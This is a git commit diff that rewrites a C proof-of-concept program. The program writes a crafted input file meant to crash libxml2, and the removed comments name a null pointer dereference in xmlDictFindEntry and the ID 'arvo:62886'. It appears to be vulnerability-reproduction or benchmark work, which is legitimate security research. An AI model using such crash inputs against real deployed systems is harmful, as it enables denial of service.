7f36b9aa9e25f7fa925cb5f49beaf5d15585d88b
Sudarshan S N <imsukudu24@gmail.com>
2026-08-08 17:07:16 +0000

    user not found error

--- trial_workspace/poc.c
+++ trial_workspace/poc.c
@@ -1,37 +1,40 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-
-/* PoC for arvo:62886 */
-/* Triggers: null pointer dereference in xmlDictFindEntry */
-/* Vuln class: null_pointer_dereference */
 
 int main(void) {
     FILE *f = fopen("/tmp/poc", "wb");
     if (!f) { perror("fopen"); return 1; }
 
-    /* Write maxAlloc = 100 (big-endian) - allows dict struct, fails table allocation */
-    fputc(0x00, f);
-    fputc(0x00, f);
-    fputc(0x00, f);
-    fputc(0x64, f);
+    /* Offset 0-7: 8 bytes of zeros for random_options */
+    unsigned long long random_options = 0;
+    fwrite(&random_options, 8, 1, f);
 
-    /* Write XPath expression: "a:*" followed by backslash-newline */
-    fputc('a', f);
-    fputc(':', f);
-    fputc('*', f);
-    fputc(0x5C, f);
-    fputc(0x0A, f);
+    /* Byte 8: 'a' (0x00000061) as 32-bit LE */
+    unsigned int a_char = 0x00000061;
+    fwrite(&a_char, 4, 1, f);
 
-    /* Write XML document with namespace to trigger dict lookup */
-    fprintf(f, "<?xml version=\"1.0\"?>");
-    fprintf(f, "<doc xmlns:a=\"http://ns\">");
-    fprintf(f, "<a:child/>");
-    fprintf(f, "</doc>");
+    /* Byte 12: ')' (0x00000029) as 32-bit LE */
+    unsigned int close_paren = 0x00000029;
+    fwrite(&close_paren, 4, 1, f);
 
-    /* Write backslash-newline terminator */
-    fputc(0x5C, f);
-    fputc(0x0A, f);
+    /* Byte 16: '{' (0x0000007B) as 32-bit LE */
+    unsigned int open_brace = 0x0000007B;
+    fwrite(&open_brace, 4, 1, f);
+
+    /* Byte 20: '1' (0x00000031) as 32-bit LE */
+    unsigned int digit_one = 0x00000031;
+    fwrite(&digit_one, 4, 1, f);
+
+    /* Byte 24: '0' (0x00000030) as 32-bit LE */
+    unsigned int digit_zero = 0x00000030;
+    fwrite(&digit_zero, 4, 1, f);
+
+    /* Byte 28: '0' (0x00000030) as 32-bit LE */
+    fwrite(&digit_zero, 4, 1, f);
+
+    /* Byte 32: '}' (0x0000007D) as 32-bit LE */
+    unsigned int close_brace = 0x0000007D;
+    fwrite(&close_brace, 4, 1, f);
 
     fclose(f);
     return 0;
